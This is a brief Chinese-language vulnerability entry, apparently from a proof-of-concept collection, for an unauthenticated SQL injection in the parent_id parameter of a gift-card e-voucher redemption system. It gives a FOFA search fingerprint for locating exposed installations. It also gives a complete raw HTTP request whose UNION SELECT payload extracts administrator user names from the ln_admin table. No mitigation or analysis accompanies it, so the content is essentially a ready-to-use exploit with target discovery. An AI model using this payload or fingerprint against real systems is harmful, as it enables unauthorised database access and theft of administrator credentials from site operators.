# 礼品卡电子券收卡系统parent_id存在前台存在SQL注入

# fofa
```
"/Application/Home/Static/css/style2.css"
```

# poc
```javascript
GET  /Home/Api/getRegion/parent_id/1)%20union%20select%201,2,user_name,4,5,6,7,8,9%20from%20ln_admin%20where%20(1=1 HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://127.0.0.1:8066/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: think_language=zh-CN; PHPSESSID=p4d3rprbojktlbnfhrd9gv1gk4
Connection: keep-alive
```
